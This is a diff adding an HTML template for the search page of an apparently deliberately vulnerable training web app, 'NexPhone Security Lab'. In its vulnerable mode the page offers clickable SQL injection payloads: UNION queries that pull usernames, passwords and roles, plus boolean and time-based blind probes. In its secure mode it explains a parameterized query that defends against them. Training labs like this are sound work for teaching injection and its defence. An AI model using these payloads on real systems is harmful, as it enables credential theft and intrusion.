@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Search — NexPhone Security Lab</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<nav class="nav">
+  <a href="{{ url_for('index') }}" class="nav-brand"><span>⬡</span> NexPhone</a>
+  <ul class="nav-links">
+    <li><a href="{{ url_for('index') }}">Shop</a></li>
+    <li><a href="{{ url_for('search') }}" class="active">Search</a></li>
+    <li><a href="{{ url_for('consult') }}">Consult</a></li>
+    {% if session.get('role') == 'admin' %}<li><a href="{{ url_for('admin') }}">Admin</a></li>{% endif %}
+    {% if session.get('user_id') %}
+    <li><a href="{{ url_for('logout') }}" class="btn btn-outline btn-sm">Logout</a></li>
+    {% else %}
+    <li><a href="{{ url_for('login') }}" class="btn btn-primary btn-sm">Login</a></li>
+    {% endif %}
+  </ul>
+  {% if secure_mode %}
+  <span class="mode-badge secure">Secure Mode</span>
+  {% else %}
+  <span class="mode-badge vuln">Vulnerable Mode</span>
+  {% endif %}
+</nav>
+
+<div class="container page-wrapper">
+  <div class="hero" style="padding-bottom:1rem;">
+    <p class="hero-label">Product Search</p>
+    <h1 class="page-title">Search Phones</h1>
+    <p class="page-subtitle">
+      {% if not secure_mode %}
+      ⚠ Vulnerable mode: the <code class="code-inline">q</code> parameter is injectable.
+      {% else %}
+      ✔ Secure mode: parameterized LIKE query.
+      {% endif %}
+    </p>
+  </div>
+
+  <!-- Search Form -->
+  <form method="GET" action="{{ url_for('search') }}" class="search-form">
+    <input type="text" name="q" class="form-control" id="searchInput"
+           value="{{ query }}"
+           placeholder="Search by name... (try: iPhone)">
+    <button type="submit" class="btn btn-primary">Search</button>
+  </form>
+
+  <!-- Raw SQL display -->
+  {% if raw_sql %}
+  <div style="margin-bottom:1.5rem;">
+    <p style="font-family:var(--mono);font-size:.7rem;color:var(--danger);text-transform:uppercase;letter-spacing:1px;margin-bottom:.5rem;">
+      ⚡ Executed SQL Query:
+    </p>
+    <div class="sql-box">{{ raw_sql }}</div>
+  </div>
+  {% endif %}
+
+  <!-- Error display (intentional in vulnerable mode) -->
+  {% if error %}
+  <div class="alert alert-danger" style="font-family:var(--mono);font-size:.82rem;">
+    {{ error }}
+  </div>
+  {% endif %}
+
+  <!-- Results -->
+  {% if query %}
+    {% if results %}
+    <p style="font-size:.82rem;color:var(--text-muted);margin-bottom:1rem;">
+      {{ results|length }} result(s) for "<strong style="color:var(--text);">{{ query }}</strong>"
+    </p>
+    <div class="product-grid">
+      {% for p in results %}
+      <div class="card product-card">
+        <div class="product-image-slot" style="height:120px;font-size:3rem;">
+          {% if 'iPhone' in p['name'] %}📱
+          {% elif 'Samsung' in p['name'] %}📲
+          {% elif 'Xiaomi' in p['name'] %}🔴
+          {% elif 'Pixel' in p['name'] %}🟢
+          {% elif 'OnePlus' in p['name'] %}🔵
+          {% elif 'Sony' in p['name'] %}🟣
+          {% else %}📱
+          {% endif %}
+        </div>
+        <div class="card-body product-info">
+          <!-- In UNION attack, columns may contain injected data -->
+          <div class="product-name" style="word-break:break-all;">{{ p[1] if p[1] else p['name'] }}</div>
+          <div class="product-desc" style="word-break:break-all;-webkit-line-clamp:3;">
+            <!-- Show all columns for UNION injection visibility -->
+            {% if not secure_mode %}
+              Col[2]: {{ p[2] }}<br>
+              {% if p[3] is defined %}Col[3]: {{ p[3] }}{% endif %}
+            {% else %}
+              {{ p['description'] }}
+            {% endif %}
+          </div>
+          <div class="product-price">
+            {% if p['price'] is defined %}
+              ${{ "%.2f"|format(p['price']) }}
+            {% else %}
+              {{ p[2] }}
+            {% endif %}
+          </div>
+          <a href="{{ url_for('product_detail', product_id=p['id']) }}"
+             class="btn btn-outline btn-sm" style="margin-top:.75rem;">
+            View Details →
+          </a>
+        </div>
+      </div>
+      {% endfor %}
+    </div>
+    {% elif not error %}
+    <div class="alert alert-info">
+      No products found matching "<strong>{{ query }}</strong>".
+    </div>
+    {% endif %}
+  {% endif %}
+
+  <!-- Attack Lab -->
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-top:2.5rem;flex-wrap:wrap;">
+
+    {% if not secure_mode %}
+
+    <!-- UNION attacks -->
+    <div class="lab-panel" style="margin-top:0;">
+      <div class="lab-panel-title">UNION-based Injection — Data Extraction</div>
+      <p style="color:var(--text-muted);font-size:.82rem;margin-bottom:1rem;">
+        Inject into the search box. The UNION appends rows from other tables.
+      </p>
+      <div class="sql-box">SELECT * FROM products WHERE name LIKE '%{q}%'</div>
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--warning);margin:.75rem 0 .5rem;">Payloads:</p>
+      <ul class="payload-list">
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          ' UNION SELECT 1, username, password, role FROM users --
+        </li>
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          ' UNION SELECT id, username, password, role FROM users --
+        </li>
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          ' ORDER BY 100 --
+        </li>
+      </ul>
+      <div style="margin-top:1rem;padding:.75rem;background:rgba(255,77,106,.06);border:1px solid rgba(255,77,106,.2);border-radius:8px;">
+        <p style="font-size:.78rem;color:#ff9a9a;line-height:1.6;">
+          Click a payload to auto-fill the search box, then click Search. 
+          User credentials will appear in the results grid.
+        </p>
+      </div>
+    </div>
+
+    <!-- Blind attacks -->
+    <div class="lab-panel" style="margin-top:0;">
+      <div class="lab-panel-title">Blind SQL Injection</div>
+      <p style="color:var(--text-muted);font-size:.82rem;margin-bottom:1rem;">
+        When there's no visible output, observe <em>response differences</em> (boolean)
+        or <em>response delays</em> (time-based).
+      </p>
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--warning);margin-bottom:.5rem;">Boolean-based:</p>
+      <ul class="payload-list" style="margin-bottom:1rem;">
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          iPhone' AND 1=1 --
+        </li>
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          iPhone' AND 1=2 --
+        </li>
+      </ul>
+      <p style="font-family:var(--mono);font-size:.7rem;color:var(--warning);margin-bottom:.5rem;">Time-based (SQLite):</p>
+      <ul class="payload-list">
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          iPhone' AND randomblob(100000000) --
+        </li>
+        <li class="payload-item" onclick="document.getElementById('searchInput').value=this.textContent.trim()">
+          iPhone' AND randomblob(500000000) --
+        </li>
+      </ul>
+      <div style="margin-top:1rem;padding:.75rem;background:rgba(255,186,8,.06);border:1px solid rgba(255,186,8,.2);border-radius:8px;">
+        <p style="font-size:.78rem;color:var(--warning);line-height:1.6;">
+          <strong>1=1</strong> → results returned (TRUE).
+          <strong>1=2</strong> → no results (FALSE).
+          <strong>randomblob</strong> → noticeable server delay.
+        </p>
+      </div>
+    </div>
+
+    {% else %}
+
+    <!-- Secure explanation -->
+    <div class="lab-panel" style="margin-top:0;border-color:rgba(46,213,115,.3);grid-column:1/-1;">
+      <div class="lab-panel-title" style="color:var(--success);">Defense Active — Parameterized LIKE Query</div>
+      <div class="sql-box secure">SELECT * FROM products WHERE name LIKE ?
+-- Bound value: "%{user_input}%"
+-- The % wildcards are added by Python, not by SQL parsing
+-- Single quotes inside input cannot break out of the string</div>
+      <p style="color:var(--text-muted);font-size:.85rem;margin-top:1rem;">
+        All UNION and blind injection payloads above are neutralized.
+        SQL errors are caught and replaced with generic messages.
+      </p>
+    </div>
+
+    {% endif %}
+  </div>
+
+</div>
+
+<footer class="footer">NexPhone Security Lab · Educational Use Only</footer>
+
+<script>
+// Highlight which payload is selected
+document.querySelectorAll('.payload-item').forEach(el => {
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.payload-item').forEach(x => x.style.borderColor = '');
+    el.style.borderColor = 'var(--danger)';
+    el.style.color = 'var(--warning)';
+  });
+});
+</script>
+</body>
+</html>
